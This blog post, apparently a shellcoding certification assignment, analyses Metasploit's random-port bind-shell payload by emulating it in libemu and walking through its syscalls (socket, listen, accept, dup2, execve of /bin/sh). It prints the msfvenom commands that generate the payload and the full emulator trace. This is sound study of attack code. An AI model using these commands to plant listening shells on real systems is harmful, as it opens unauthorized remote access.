---
layout: post
title: "Analyzing Metasploit linux/x86/shell_bind_tcp_random_port module using Libemu"
date: 2017-05-06 12:00:00
share: true
comments: true
tags: [Exploit Development, Shellcoding, SLAE, OSCE Prep]
---

_This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)._
_**Student ID:** SLAE-885_
_**Assignment number:** 5.2_
_**Github repo:** <https://github.com/abatchy17/SLAE>_  

---
  
In the second part of assignment 5 in SLAE, I'll be analyzing the `linux/x86/shell_bind_tcp_random_port` module using Libemu.  


## 1\. Setting payload parameters

  
First let's check the options for this module.  

```console
root@kali:~/Desktop/libemu/tools/sctest# msfvenom -p linux/x86/shell_bind_tcp_random_port --payload-options  
Options for payload/linux/x86/shell_bind_tcp_random_port:  
  
  
       Name: Linux Command Shell, Bind TCP Random Port Inline  
     Module: payload/linux/x86/shell_bind_tcp_random_port  
   Platform: Linux  
       Arch: x86  
Needs Admin: No  
 Total size: 57  
       Rank: Normal  
  
Provided by:  
    Geyslan G. Bem <geyslan@gmail.com>  
  
Description:  
  Listen for a connection in a random port and spawn a command shell.   
  Use nmap to discover the open port: 'nmap -sS target -p-'.  
```    

  
I skipped over the advanced settings as they won't be discussed in this post. Lucky for us, this payload doesn't require any options as it will bind to the local IP and choose a port randomly (you'll use nmap to find that port).  
  
---


## 2\. Analyzing payload with libemu

After you install `libemu` (you might need to install a few packages like `autoconf` and `libtool`) let's pipe the raw output to ScTest (Iterate 1000 times with verbose output).

```console
root@kali:~/Desktop/libemu/tools/sctest# msfvenom -p linux/x86/shell_bind_tcp_random_port -f raw | ./sctest -vvv -Ss 10000  
verbose = 3  
No platform was selected, choosing Msf::Module::Platform::Linux from the payload  
No Arch selected, selecting Arch: x86 from the payload  
No encoder or badchars specified, outputting raw payload  
Payload size: 57 bytes  
```

```cpp
int socket (  
     int domain = 2;  
     int type = 1;  
     int protocol = 0;  
) =  14;  
int listen (  
     int s = 14;  
     int backlog = 0;  
) =  0;  
int accept (  
     int sockfd = 14;  
     sockaddr_in * addr = 0x00000000 =>   
         none;  
     int addrlen = 0x00000002 =>   
         none;  
) =  19;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 14;  
) =  14;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 13;  
) =  13;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 12;  
) =  12;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 11;  
) =  11;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 10;  
) =  10;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 9;  
) =  9;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 8;  
) =  8;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 7;  
) =  7;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 6;  
) =  6;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 5;  
) =  5;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 4;  
) =  4;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 3;  
) =  3;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 2;  
) =  2;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 1;  
) =  1;  
int dup2 (  
     int oldfd = 19;  
     int newfd = 0;  
) =  0;  
int execve (  
     const char * dateiname = 0x00416fb6 =>   
           = "/bin//sh";  
     const char * argv[] = [  
           = 0xffffffff =>   
             none;  
     ];  
     const char * envp[] = 0x00000000 =>   
         none;  
) =  0;  
```    

  
Lots of debug info, but let's focus on the syscalls being made. To make it easier, sctest allows us to create a visual representation of the flow.  

```console
root@kali:~/Desktop/libemu/tools/sctest# msfvenom -p linux/x86/shell_bind_tcp_random_port -f raw | ./sctest -vvv -Ss 10000 -G tcp_random_port.dot  
  
.. redacted..  
  
root@kali:~/Desktop/libemu/tools/sctest# ls  
dot.c        Makefile.in  sctest          sctest-sctestmain.o  tests.c  
dot.h        nanny.c      sctest-dot.o    sctest-tests.o       tests.h  
Makefile     nanny.h      sctestmain.c    sctest-userhooks.o   userhooks.c  
Makefile.am  options.h    sctest-nanny.o  tcp_random_port.dot  userhooks.h  
root@kali:~/Desktop/libemu/tools/sctest# dot tcp_random_port.dot -T png > tcp_random_port.png  
```    

[![](http://i.imgur.com/MH3L6qb.png)](http://i.imgur.com/MH3L6qb.png)

---

#### 1\. `socket()`

```cpp
int socket (  
     int domain = 2;  
     int type = 1;  
     int protocol = 0;  
) =  14;  
```    

Same call we made for both bind and reverse shell previously, creating a socket that supports TCP communication, sockfd returned is 14.

#### 2\. `listen()`

```
int listen (  
     int s = 14;  
     int backlog = 0;  
) =  0;  
```

Next, it starts a listener for incoming connections on sockfd. Note: `bind()` is not required and a random port is picked. Instead you'll need to scan the host for open ports. More info here: http://stackoverflow.com/questions/12763268/why-is-bind-used-in-tcp-why-is-it-used-only-on-server-side-and-not-in-client  

---

#### 3\. `accept()`

```cpp
int accept (  
     int sockfd = 14;  
     sockaddr_in * addr = 0x00000000 =>   
         none;  
     int addrlen = 0x00000002 =>   
         none;  
) =  19;  
```

When there's an incoming connection on the socket created earlier, accept it without storing the client data `sockaddr_in`. New sockfd is 19.  

---

#### 4\. `dup2()`

Next, the traffic is redirected to the newly created socket (19) by calling `dup2()`, which will duplicate the STDIN,STDOUT and STDERR to the socket. Notice that there's a loop using ECX as an index, ECX's value is pulled from the latest value pushed onto stack.  
  
After `accept()`, there's a `POP ECX` command, which will now contain the value last pushed into stack. If you scroll up you'll find that it was a `PUSH EAX`.
EAX contains `sockfd` returned from `socket()`. This allows us to use a small number without worrying too much about looping too much.  
  
Of course, this logic any error check, but you don't have that luxury while shellcoding.  

---

#### 5\. `execve()`

  
This part is simple, it's simply calls a `/bin/sh` shell.  
  
\- Abatchy

